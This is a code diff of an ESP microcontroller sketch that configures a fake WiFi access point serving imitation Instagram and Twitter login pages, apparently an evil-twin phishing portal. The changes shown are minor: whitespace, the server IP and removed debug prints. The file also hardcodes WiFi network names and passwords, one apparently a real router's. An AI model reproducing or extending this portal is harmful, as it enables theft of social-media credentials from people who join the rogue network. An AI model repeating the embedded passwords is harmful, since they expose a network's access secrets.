@@ -4,8 +4,8 @@
 
 
 //variable para el nombre del wifi
-const char* SSID   = "ESP.local-server";
-const char* PASS   = "SECUREhash9361";
+const char* SSID      = "ESP.local-server";
+const char* PASS      = "SECUREhash9361";
 const char* WIFI_SSID = "Finetwork_82FBD";
 const char* WIFI_PSW  = "2c2D4GeA";
 
@@ -20,7 +20,7 @@ const char* IS_PATH = "/webpages/instagram-login";
 const char* TW_PATH = "/webpages/twitter-login";
 
 //IPAddress apip(192,168,1,1);
-const IPAddress* serverip = new IPAddress(10,10,10,1);
+const IPAddress* serverip = new IPAddress(10,10,1,1);
 //byte apmac[6];
 
 FakeAP* accessPoint = new FakeAP(80);
@@ -35,11 +35,6 @@ void setup()
   Serial.println("Loading....");
   delay(1000);
 
-  Serial.println("File dir test: ");
-  Serial.println(SDCardManager::getFileDir(ADMIN_PAGE));
-  Serial.println(SDCardManager::getFileDir(FB_PATH));
-  Serial.println(SDCardManager::getFileDir(AUTH_PAGE));
-  
   accessPoint->setPath(ADMIN_PAGE, ADMINPAGE);
   accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);
   //accessPoint->setPath(THKS_PAGE,  EXITPAGE);
